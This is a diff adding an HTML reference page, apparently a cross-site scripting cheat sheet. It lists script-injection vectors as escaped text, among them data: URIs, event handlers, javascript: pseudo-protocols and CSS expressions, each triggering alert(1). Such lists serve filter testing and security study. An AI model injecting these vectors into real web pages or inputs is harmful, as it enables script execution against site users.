@@ -1,0 +1,55 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Methods of scripts execution</title>
+</head><body><b><span style="font-size: 10pt">Original HTML XSS is<br/>
+</span></b><span style="font-size: 10pt"><tt><br/>
+</tt><tt>&lt;script&gt;alert(1)&lt;/script&gt;</tt><b><br/>
+</b><b><br/>
+</b><b>Script tags</b><br/>
+</span><tt><br/>
+&lt;object data=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;<br/>
+&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;<br/>
+</tt><tt>&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt; Click here&lt;/a&gt;</tt><br/>
+<br/>
+<b>Event Handlers</b><br/>
+<tt><br/>
+&lt;xml onreadystatechange=alert(1)&gt;<br/>
+&lt;style onreadystatechange=alert(1)&gt;<br/>
+&lt;iframe onreadystatechange=alert(1)&gt;<br/>
+&lt;object onerror=alert(1)&gt;<br/>
+&lt;object type=image src=valid.gif onreadystatechange=alert(1)&gt;&lt;/object&gt;<br/>
+&lt;img type=image src=valid.gif onreadystatechange=alert(1)&gt;<br/>
+&lt;img onerror=alert(1) src=a&gt;<br/>
+&lt;input type=image src=valid.gif onreadystatechange=alert(1)&gt;<br/>
+&lt;isindex type=image src=valid.gif onreadystatechange=alert(1)&gt;<br/>
+&lt;script onreadystatechange=alert(1)&gt;<br/>
+&lt;bgsound onpropertychange=alert(1)&gt;<br/>
+&lt;body onbeforeactivate=alert(1)&gt;<br/>
+&lt;body onactivate=alert(1)&gt;<br/>
+&lt;body onfocusin=alert(1)&gt;<br/>
+&lt;b style=behavior:url(#default#time2) onbegin=alert(1)&gt;<br/>
+&lt;i onclick=alert(1)&gt;Click here&lt;/i&gt;<br/>
+<br/>
+</tt><b>Event Handlers HTML5</b><br/>
+<tt><br/>
+&lt;input autofocus onfocus=alert(1)&gt;<br/>
+&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;<br/>
+&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;input autofocus&gt;<br/>
+&lt;/a onmousemove=alert(1)&gt;<br/>
+&lt;video src=1 onerror=alert(1)&gt;<br/>
+&lt;audio src=1 onerror=alert(1)&gt;<br/>
+</tt><br/>
+<b>Script pseudo-protocls</b><br/>
+<tt><br/>
+&lt;object data=javascript:alert(1)&gt;<br/>
+&lt;iframe src=javascript:alert(1)&gt;<br/>
+</tt><tt>&lt;embed src=javascript:alert(1)&gt;</tt><br/>
+<tt>&lt;form id=test /&gt;&lt;button form=test formaction=javascript:alert(1)&gt;<br/>
+&lt;event-source src=javascript:alert(1)&gt;<br/>
+<br/>
+</tt><b>Dynamically Evaluated Styles</b><br/>
+<tt><br/>
+&lt;x style=x:expression(alert(1))&gt;<br/>
+&lt;x style=behavior:url(#default#time2) onbegin=alert(1)&gt;<br/>
+</tt></body></html>
